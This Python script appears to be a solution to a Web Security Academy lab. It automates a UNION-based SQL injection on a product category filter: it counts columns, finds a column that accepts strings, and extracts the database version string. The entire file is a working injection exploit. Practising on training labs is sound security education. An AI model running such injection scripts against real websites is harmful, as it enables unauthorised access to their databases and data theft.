import urllib3
import requests
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def column_number_guesser(session,url) :
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    initial_payload = apostrophe + space + union + space + select + space
    payload = "NULL"
    comment = "%23"
    
    while (session.get(url + initial_payload + payload + comment, verify=False).status_code == 500):
        payload += ",NULL"
    
    return payload

def vulnerable_column_determination (session,url,payload):
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    initial_payload = apostrophe + space + union + space + select + space
    comma = ','
    comment = "%23"
    
    spots = payload.split(comma)
    trials =[]
    for i in range(len(spots)) :
        
        trial = ""
        trial += comma.join(spots[:i])
        if i == 0 :
            trial += "'a'" + comma
        elif i == len(spots) - 1  :
            trial += comma + "'a'"
        else :
            trial += comma + "'a'" + comma
        
        trial += comma.join(spots[i+1:])
        trials.append(trial)
    
    
    for trial_payload in trials :

        resp = session.get(url + initial_payload + trial_payload + comment, verify=False)
        
        if not "Internal Server Error" in resp.text :
            return  trial_payload
    
    return None

def main() :
    url = "https://0acf008404586a3b80bb085a00de006b.web-security-academy.net"
    product_url = f'{url}/filter?category=Gifts'
    apostrophe = "'"
    space = " "
    union = "UNION"
    select = "SELECT"
    comment = "%23"

    payload =  "@@version" 

    session = requests.Session()

    number_of_columns_payload = column_number_guesser(session,product_url)
    
    type_detect_payload = vulnerable_column_determination(session,product_url,number_of_columns_payload)
    
    type_detect_payload = type_detect_payload.replace("'a'",payload)

    final_payload = apostrophe + space + union + space + select + space + type_detect_payload + comment

    response = session.get(product_url + final_payload, verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    version_th = soup.find('th', string=lambda s:s and "ubuntu" in s)

    if version_th:
        print("Koated !!!")
        print(f'Version : {version_th.get_text()} ')

    else:
        print("Siks")

if __name__ == "__main__":
    main()


    

